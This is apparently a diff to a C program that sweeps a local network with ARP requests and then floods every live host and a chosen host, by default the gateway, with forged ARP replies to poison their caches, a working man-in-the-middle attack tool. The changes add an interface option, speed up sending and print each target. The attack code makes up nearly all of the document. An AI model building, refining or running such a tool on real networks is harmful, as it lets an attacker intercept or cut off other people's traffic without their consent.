@@ -21,18 +21,20 @@
 #define MACSLEN  25
 #define TCPBUFZ  68880
 #define NPACKS   20
-#define SDELAY   1000
-#define STIMEOUT 15
+#define SDELAY   500
+#define STIMEOUT 7 
 
 
-int is_valid_ip(char *ipAddress);
 void clean_exit(int e_no);
 void print_usage(char *pname);
 void sigintHandler(int sig_num);
-static void mac_to_str(char *mac_str, unsigned char mac[ETH_ALEN]);
-void parse_bytes(const char* str, char sep, unsigned char *bytes, int maxBytes, int base);
+void mac_to_str(char *mac_str, unsigned char mac[ETH_ALEN]);
+void parse_bytes(char* str, char sep, unsigned char *bytes, int maxBytes, int base);
+void ip_sweep(int sock, int if_idx, uint8_t s_ip[IP_ALEN],
+                                    unsigned char s_mac[ETH_ALEN], 
+                                    unsigned char up_ips[255][ETH_ALEN]);
+int is_valid_ip(char *ipAddress);
 int recv_arp(int sock, char *buf, unsigned short int op_code, uint8_t s_ip[4]);
-void ip_sweep(int sock, char *LAN, uint8_t s_ip[IP_ALEN], unsigned char s_mac[ETH_ALEN], int if_idx, unsigned char up_ips[255][ETH_ALEN]);
 int get_if_info(int sock, char dev[IFNAMSIZ], 
                           struct ifreq *ifreq_i,
                           struct ifreq *ifreq_c,
@@ -56,14 +58,11 @@ int main(int argc, char *argv[]) {
     char dev[IFNAMSIZ];
     char LAN_ip[IPSLEN-4];
     char our_m_str[MACSLEN], target_m_str[MACSLEN], host_m_str[MACSLEN];
-    char our_ip_str[IPSLEN], host_str[IPSLEN], target_str[IPSLEN];
+    char our_ip_str[IPSLEN], host_str[IPSLEN]; 
     unsigned char our_mac[ETH_ALEN], target_mac[ETH_ALEN], host_mac[ETH_ALEN];
     struct ifreq ifreq_i, ifreq_c, ifreq_ip;
     uint8_t our_ip[4], host_ip[4], target_ip[4];
-    int send_len, recv_len, total_len;
-    int last_dot, sufix;
-    int sock, i, h;
-    int num_packets;
+    int sock;
 
     unsigned char *recv_buf                  = calloc(ARPSIZ, sizeof(unsigned char *));
     unsigned char up_ips_macs[255][ETH_ALEN] = {0};
@@ -84,18 +83,23 @@ int main(int argc, char *argv[]) {
     bp      = recv_buf;
     signal(SIGINT, sigintHandler);
 
-
-    // get interface from arg or pcap 
-    if (argc > 1) {
-        int len = strlen(argv[1]);
+    // get inferface from argument or pcap
+    int dev_from_arg = 0;
+    for (int i = 0; i < argc-1; i++) {
+        if (strcmp(argv[i], "-i") == 0) {
+            dev_from_arg = i+1;
+            break;
+        }
+    }
+    if (dev_from_arg) {
+        int len = strlen(argv[dev_from_arg]);
 
         if (len > IFNAMSIZ) {
-            printf("Interface name %s too long (try renaming it)\n", argv[1]);
+            printf("Interface name %s too long (try renaming it)\n", argv[dev_from_arg]);
             clean_exit(1);
         }
-        strncpy(dev, argv[1], IFNAMSIZ);
+        strncpy(dev, argv[dev_from_arg], IFNAMSIZ);
         dev[len] = 0;
-        argv++;
     }
     else {
         char errbuf[PCAP_ERRBUF_SIZE];
@@ -134,20 +138,25 @@ int main(int argc, char *argv[]) {
     parse_bytes(our_ip_str, '.', our_ip, 4, 10);
 
     // parse IP LAN
-    last_dot = (strrchr(our_ip_str, '.')-our_ip_str);
+    int last_dot = (strrchr(our_ip_str, '.')-our_ip_str);
     strncpy(LAN_ip, our_ip_str, last_dot);
     LAN_ip[last_dot] = 0;
 
     // set defaults
-    num_packets = NPACKS;
-    sufix       = 1;
+    int num_packets = NPACKS;
+    int sufix       = 1;
 
     // get optional arguments
     int op = 0;
-    while ((op = getopt(argc, argv, "h:n:")) != FAIL) {
+    while ((op = getopt(argc, argv, "h:n:i:")) != FAIL) {
         switch (op) {
 
+            case 'i':
+                // ignore interface option
+                break;
+
             case 'h':
+                // host sufix option
                 if ((sufix = atoi(optarg)) > 254) {
                         printf("host sufix %d to high (over 254)\n", sufix);
                         clean_exit(1);
@@ -155,6 +164,7 @@ int main(int argc, char *argv[]) {
                 break;
 
             case 'n':
+                // num-packets option
                 num_packets = atoi(optarg);
                 break;
 
@@ -172,10 +182,10 @@ int main(int argc, char *argv[]) {
         printf("Error %s is not a vaild ip address\n", host_str);
         clean_exit(6);
     }
-    parse_bytes(host_str, '.', host_ip, 4, 10);
+    host_ip[3] = sufix;
 
-    // scan network for hosts
-    ip_sweep(sock, LAN_ip, our_ip, our_mac, ifreq_i.ifr_ifindex, up_ips_macs);
+    // scan network for targets 
+    ip_sweep(sock, ifreq_i.ifr_ifindex, our_ip, our_mac, up_ips_macs);
 
     // save host mac
     memcpy(host_mac, up_ips_macs[sufix], ETH_ALEN);
@@ -187,19 +197,20 @@ int main(int argc, char *argv[]) {
     target_ip[2] = our_ip[2];
 
     // poison everyone
-    h = 0;
-    for (i = 2; i < 255; i++) {
+    int h = 0;
+    for (int i = 2; i < 255; i++) {
         if (i != sufix && memcmp(up_ips_macs[i], empty, ETH_ALEN)) {
-            h++;
             target_ip[3] = i;
+
             memcpy(target_mac, up_ips_macs[i], ETH_ALEN);
             mac_to_str(target_m_str, target_mac);
 
-            printf("\nTarget %d\n\n", h);
+            printf("\nTarget %d: %s.%d\n\n", ++h, LAN_ip, i);
 
             // poison host
-            printf("Poisoning host...\n");
-            for (int i = num_packets; i > 0; --i) {
+            printf("Poisoning host %s...\n", host_str);
+            int p = num_packets;
+            while (p--) {
                 send_arp(sock, ifreq_i.ifr_ifindex, our_mac,
                         host_mac, 
                         our_mac, 
@@ -213,8 +224,9 @@ int main(int argc, char *argv[]) {
             }
 
             // poison target 
-            printf("Poisoning target...\n");
-            for (int i = num_packets; i > 0; --i) {
+            printf("Poisoning target %s.%d...\n", LAN_ip, i);
+            p = num_packets;
+            while (p--) {
                 send_arp(sock, ifreq_i.ifr_ifindex, our_mac,
                         target_mac,
                         our_mac,
@@ -235,7 +247,7 @@ void print_usage(char *pname) {
     printf("Usage: (sudo) %s [interface] [-h host-sufix (default 1)] [-n num-packets (default 20)]\n", pname);
 }
 
-int recv_arp(int sock, char *buf, unsigned short int op_code, uint8_t s_ip[4]) {
+int recv_arp(int sock, char *buf, unsigned short int op_code, uint8_t s_ip[IP_ALEN]) {
     int bytes_recvd;
 
     while (1) {
@@ -251,20 +263,19 @@ int recv_arp(int sock, char *buf, unsigned short int op_code, uint8_t s_ip[4]) {
     }
 }
 
-void ip_sweep(int sock, char *LAN, uint8_t s_ip[IP_ALEN], 
-                                   unsigned char s_mac[ETH_ALEN], int if_idx, 
-                                   unsigned char up_ips[255][ETH_ALEN]) {
-    char t_str[IPSLEN];
+void ip_sweep(int sock, int if_idx, uint8_t s_ip[IP_ALEN], 
+                                    unsigned char s_mac[ETH_ALEN],  
+                                    unsigned char up_ips[255][ETH_ALEN]) {
     uint8_t t_ip[IP_ALEN];
-    int i, n_h;
 
+    memcpy(t_ip, s_ip, IP_ALEN);
+    
     // spam ARP requests
     printf("sweep scan ...\n");
 
-    for (i = 1; i < 254; i++) {
-        memset(t_str, 0, IPSLEN);
-        sprintf(t_str, "%s.%d", LAN, i);
-        parse_bytes(t_str, '.', t_ip, IP_ALEN, 10);
+    int i = 255;
+    while (i--) {
+        t_ip[3] = i;
         send_arp(sock, if_idx, s_mac,
                 broadcast,
                 s_mac,
@@ -283,6 +294,7 @@ void ip_sweep(int sock, char *LAN, uint8_t s_ip[IP_ALEN],
 
     endwait = start + seconds;
 
+    int n_h = 0;
     while (start < endwait) {
         printf("%d seconds left...\r", (int)(endwait - start));
         fflush(stdout);
@@ -297,19 +309,17 @@ void ip_sweep(int sock, char *LAN, uint8_t s_ip[IP_ALEN],
 
             if (ntohs(arp->ea_hdr.ar_op) == ARPOP_REPLY) {
                 memcpy(up_ips[arp->arp_spa[3]], arp->arp_sha, ETH_ALEN);
+                
+                printf("IP %d.%d.%.d.%-3d is up: %d up\n", t_ip[0], 
+                                                           t_ip[1], 
+                                                           t_ip[2], 
+                                                           arp->arp_spa[3], 
+                                                           ++n_h);
             }
         }
         start = time(NULL);
     }
-
-    // count hosts
-    n_h = 0;
-    for (i = 0; i < 255; ++i) {
-        if (memcmp(up_ips[i], empty, ETH_ALEN)) {
-            n_h++;
-        }
-    }
-    printf("\n%d targets up\n", n_h);
+    printf("\n%d targets up (ignoring host)\n", n_h);
 }
 
 void clean_exit(int e_no) {
@@ -324,7 +334,7 @@ void sigintHandler(int sig_num) {
     clean_exit(0);
 }
 
-static void mac_to_str(char mac_str[MACSLEN], unsigned char mac[ETH_ALEN]) {
+void mac_to_str(char mac_str[MACSLEN], unsigned char mac[ETH_ALEN]) {
     snprintf(mac_str, MACSLEN, "%.2X-%.2X-%.2X-%.2X-%.2X-%.2X", 
                                                mac[0],
                                                mac[1],
@@ -334,7 +344,7 @@ static void mac_to_str(char mac_str[MACSLEN], unsigned char mac[ETH_ALEN]) {
                                                mac[5]);
 }
 
-void parse_bytes(const char* str, char sep, unsigned char *bytes, int maxBytes, int base) {
+void parse_bytes(char* str, char sep, unsigned char *bytes, int maxBytes, int base) {
     for (int i = 0; i < maxBytes; i++) {
         bytes[i] = strtoul(str, NULL, base);
         str      = strchr(str, sep);
